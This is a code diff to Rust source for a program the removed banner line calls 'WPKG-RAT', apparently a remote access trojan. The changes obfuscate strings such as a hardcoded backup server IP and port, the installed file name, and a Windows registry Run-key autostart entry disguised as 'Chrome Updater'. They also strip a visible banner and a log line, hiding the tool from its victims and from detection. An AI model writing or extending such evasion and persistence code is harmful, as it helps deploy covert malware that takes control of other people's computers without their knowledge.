@@ -15,11 +15,14 @@ use std::env;
 use std::{thread, time};
 
 use tracing::*;
+#[cfg(target_os = "windows")]
+use wpkg_macro::decode;
+use wpkg_macro::encode;
 
 use crate::addreses::{Address, Addresses};
 
 /// Server ip backup if api isn't available
-pub const TCP_BACKUP_IP: &str = "136.243.156.104";
+pub const TCP_BACKUP_IP: &str = encode!("136.243.156.104");
 /// Server port backup if api isn't available
 pub const TCP_BACKUP_PORT: u32 = 3217;
 
@@ -27,8 +30,6 @@ pub const TCP_BACKUP_PORT: u32 = 3217;
 async fn main() {
     // init logger
     logger::init();
-
-    println!("WPKG-RAT {}", globals::CURRENT_VERSION);
 
     let args: Vec<String> = env::args().collect();
     match args.iter().any(|v| v == "--update") {
@@ -72,7 +73,7 @@ async fn main() {
             let exe_path = env::current_exe()?.display().to_string();
 
             let config_dir = utils::get_working_dir()?;
-            let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");
+            let exe_target = format!("{}\\{}", &config_dir, &decode(encode!("wpkg.exe")));
 
             if exe_path != exe_target {
                 info!("WPKG not installed. Installing in {}...", &config_dir);
@@ -85,15 +86,17 @@ async fn main() {
                     //adding to autostart
                     info!("Adding to autostart");
                     utils::run_process(
-                        "reg",
+                        &decode(encode!("reg")),
                         vec![
                             "add",
-                            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            &decode(encode!(
+                                "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+                            )),
                             "/f",
                             "/v",
-                            "Chrome Updater",
+                            &decode(encode!("Chrome Updater")),
                             "/t",
-                            "REG_SZ",
+                            &decode(encode!("REG_SZ")),
                             "/d",
                             &exe_target,
                         ],
@@ -101,17 +104,16 @@ async fn main() {
                     )?;
                 }
 
-                //check if process is runned
+                // check if process is runned
                 let mut runned: i32 = 0;
                 let s = System::new_all();
-                for _ in s.processes_by_name("wpkg.exe") {
+                for _ in s.processes_by_name(&decode(encode!("wpkg.exe"))) {
                     runned += 1;
                 }
 
-                //run wpkg
+                // run wpkg
                 if runned <= 1 {
-                    info!("Running WPKG...");
-                    utils::run_process_with_work_dir(&exe_target, vec![""], false, &config_dir)?;
+                    utils::run_process_with_work_dir(&exe_target, vec![], false, &config_dir)?;
                 } else {
                     error!("WPKG is runned. Exiting...");
                 }
@@ -129,6 +131,7 @@ async fn main() {
 
     tokio::spawn(async move {
         info!("Started update check thread");
+
         loop {
             thread::sleep(time::Duration::from_secs(10 * 60));
             match updater::check_updates().await {
